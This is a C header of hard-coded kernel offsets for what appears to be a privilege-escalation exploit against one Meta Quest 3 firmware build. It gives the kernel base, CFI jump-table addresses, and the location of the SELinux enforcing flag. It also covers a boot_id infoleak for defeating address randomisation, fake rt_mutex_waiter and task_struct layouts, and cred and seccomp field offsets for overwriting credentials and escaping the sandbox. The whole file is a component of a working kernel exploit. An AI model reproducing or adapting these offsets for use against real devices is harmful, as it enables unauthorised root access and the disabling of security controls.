/*
 * eureka-52168470052900520 target offsets
 * Generated from kernel.elf analysis
 * KIMAGE_TEXT_BASE: 0xffffffc008000000
 *
 * Only the *defaults* live here. The composite address macros
 * (ASHMEM_FOPS, INIT_TASK, ...) are built in src/config.h on top of a
 * runtime-overridable struct — see src/config.c and ionstack.conf.
 * Struct-offset defines further below stay compile-time only.
 */
#ifndef TARGET_H
#define TARGET_H

#define BUILD_VARIANT_LABEL "eureka_q3_52168470052900520"
#define BUILD_FINGERPRINT "oculus/quest3/quest3:14/UP1A.231005.007.A1/52168470052900520:user/release-keys"

#define KIMAGE_TEXT_BASE_DEFAULT 0xffffffc008000000ULL
#define P0_PAGE_OFFSET 0xffffff8000000000ULL
#define P0_PHYS_OFFSET 0x80000000ULL
#define P0_KERNEL_PHYS_LOAD 0xA8000000ULL
#define KERNELSNITCH_IDENTITY_START 0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END 0xffffff9000000000ULL
#define DIRECT_MAP_BASE 0xffffff8000000000ULL
#define DIRECT_MAP_END 0xFFFFFFC000000000ULL
#define VMEMMAP_START 0xFFFFFFFEFFE00000ULL

// ============================================================
// FUNCTION POINTERS (CFI functions)
// ============================================================

#define RANDOM_MISC_FOPS_OFF 0x1e90bf8ULL  // miscdevice random_misc.fops slot
#define NULL_MISC_FOPS_OFF  0x1e90b58ULL  // miscdevice null_misc.fops slot
#define NULL_FOPS_OFF       0x1e90c68ULL  // null_fops table
#define KGSL_MISC_FOPS_OFF  0x00000000ULL  // no kgsl on this build
#define KGSL_FOPS_OFF       0x00000000ULL  // no kgsl on this build
#define ASHMEM_MISC_FOPS_OFF 0x2819688ULL // miscdevice ashmem_misc.fops slot
#define ASHMEM_FOPS_OFF 0x01ec7f20ULL
#define ASHMEM_IOCTL_OFF 0x143a040ULL   // ashmem_ioctl.cfi_jt
#define ASHMEM_COMPAT_IOCTL_OFF 0x143a048ULL  // compat_ashmem_ioctl.cfi_jt
#define ASHMEM_MMAP_OFF 0x1425460ULL    // ashmem_mmap.cfi_jt
#define ASHMEM_OPEN_OFF 0x1434fe8ULL    // ashmem_open.cfi_jt
#define ASHMEM_RELEASE_OFF 0x1434ff0ULL // ashmem_release.cfi_jt
#define ASHMEM_SHOW_FDINFO_OFF 0x14255d8ULL  // ashmem_show_fdinfo.cfi_jt
#define ASHMEM_READ_ITER_OFF 0x1425360ULL    // ashmem_read_iter.cfi_jt
#define CONFIGFS_READ_FILE_OFF 0x1434078ULL  // configfs_read_file.cfi_jt
#define CONFIGFS_WRITE_BIN_FILE_OFF 0x1434448ULL // configfs_write_bin_file.cfi_jt
#define COPY_SPLICE_READ_OFF 0x1425548ULL  // generic_file_splice_read.cfi_jt
#define NOOP_LLSEEK_OFF 0x1422748ULL       // noop_llseek.cfi_jt

// ============================================================
// KERNEL VARIABLES
// ============================================================

#define INIT_TASK_OFF 0x027ec200ULL
#define INIT_UTS_NS_OFF 0x02839928ULL
#define EMPTY_ZERO_PAGE_OFF 0x028ec000ULL
#define ROOT_TASK_GROUP_OFF 0x028f0700ULL
#define SELINUX_BLOB_SIZES_OFF 0x01f044f0ULL
#define SELINUX_ENFORCING_OFF 0x02942199  // selinux_state.enforcing
#define SECURITY_HOOK_HEADS_OFF 0x01f02110ULL
#define KMALLOC_CACHES_OFF 0x01f04f30ULL
#define ANON_PIPE_BUF_OPS_OFF 0x01db0468ULL

// ============================================================
// SLIDE (boot_id infoleak)
// ============================================================

#define SLIDE_INIT_TASK_OFF INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF ROOT_TASK_GROUP_OFF
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x027e6478ULL  // random_table + 0x108
#define SLIDE_SYSCTL_BOOTID_OFF 0x02a4f1d9ULL
#define SLIDE_LOGGERS_0_1_OFF 0x026eed80ULL  // loggers + 8
#define SLIDE_NFULNL_LOGGER_OFF 0x026eee50ULL

// ============================================================
// EXPLOIT SCRATCH OFFSETS
// ============================================================

#define LOCK_OFF 0x1000
#define FOPS_OFF 0x2000
#define W0_OFF 0x2400
#define FAKE_TASK_OFF 0x3000

// ============================================================
// RT_MUTEX_WAITER STRUCT (5.10 kernel)
// ============================================================

#define WAITER_TREE_ENTRY_OFF 0x00
#define WAITER_PI_TREE_ENTRY_OFF 0x18
#define WAITER_TASK_OFF 0x30
#define WAITER_LOCK_OFF 0x38
#define WAITER_PRIO_OFF 0x40
#define WAITER_DEADLINE_OFF 0x48

#define FAKE_WAITER_PI_TREE_ENTRY_OFF WAITER_PI_TREE_ENTRY_OFF
#define FAKE_WAITER_TASK_OFF WAITER_TASK_OFF
#define FAKE_WAITER_LOCK_OFF WAITER_LOCK_OFF
#define FAKE_WAITER_DEADLINE_OFF WAITER_DEADLINE_OFF

// ============================================================
// FAKE TASK STRUCT
// ============================================================

#define FAKE_TASK_USAGE_OFF 0x38
#define FAKE_TASK_PRIO_OFF 0x94
#define FAKE_TASK_NORMAL_PRIO_OFF 0x9c
#define FAKE_TASK_TASK_GROUP_OFF 0x310
#define FAKE_TASK_PI_LOCK_OFF 0x854
#define FAKE_TASK_PI_WAITERS_OFF 0x868
#define FAKE_TASK_PI_TOP_TASK_OFF 0x878
#define FAKE_TASK_PI_BLOCKED_ON_OFF 0x880

// ============================================================
// CONFIGFS BUFFER
// ============================================================

#define CFG_PAGE_OFF 16
#define CFG_NEEDS_READ_FILL_OFF 80
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100

// ============================================================
// TASK STRUCT
// ============================================================

#define TASK_PID_OFF 0x5C0
#define TASK_TGID_OFF 0x5C4
#define TASK_REAL_PARENT_OFF 0x5D0
#define TASK_ATOMIC_FLAGS_OFF 0x588
#define TASK_REAL_CRED_OFF 0x770
#define TASK_CRED_OFF 0x778
#define TASK_COMM_OFF 0x788
#define TASK_TASKS_OFF 0x4C0
#define TASK_THREAD_INFO_FLAGS_OFF 0x00
#define TASK_SECCOMP_OFF 0x830

// ============================================================
// CRED STRUCT
// ============================================================

#define CRED_UID_OFF 0x4
#define CRED_SECUREBITS_OFF 0x24
#define CRED_CAPS_OFF 0x28
#define CRED_SECURITY_OFF 0x78
#define CRED_USER_OFF 0x80

// ============================================================
// SELINUX
// ============================================================

#define SELINUX_CRED_BLOB_OFF 0
#define SELINUX_CRED_OSID_OFF 0
#define SELINUX_CRED_SID_OFF 4

// ============================================================
// SECCOMP
// ============================================================

#define SECCOMP_MODE_OFF 0x00
#define SECCOMP_FILTER_COUNT_OFF 0x04
#define SECCOMP_FILTER_OFF 0x08

#define TIF_SECCOMP_BIT 11
#define PFA_NO_NEW_PRIVS_BIT 0

// ============================================================
// STRUCT PAGE
// ============================================================

#define STRUCT_PAGE_SIZE 0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF 0x08
#define STRUCT_SLAB_CACHE_OFF 0x18
#define STRUCT_PAGE_TYPE_OFF 0x30

// ============================================================
// PIPE
// ============================================================

#define PIPE_BUFFER_SIZE 0x28
#define PIPE_BUFFER_SLOTS 32
#define PIPE_BUF_FLAG_CAN_MERGE 0x10

// ============================================================
// FILE_OPERATIONS
// ============================================================

#define FOPS_OWNER_OFF 0x00
#define FOPS_LLSEEK_OFF 0x08
#define FOPS_READ_OFF 0x10
#define FOPS_WRITE_OFF 0x18
#define FOPS_READ_ITER_OFF 0x20
#define FOPS_WRITE_ITER_OFF 0x28
#define FOPS_IOCTL_OFF 0x50
#define FOPS_COMPAT_IOCTL_OFF 0x58
#define FOPS_MMAP_OFF 0x60
#define FOPS_OPEN_OFF 0x70
#define FOPS_RELEASE_OFF 0x80
#define FOPS_SPLICE_READ_OFF 0xc8
#define FOPS_SHOW_FDINFO_OFF 0xe0

#endif
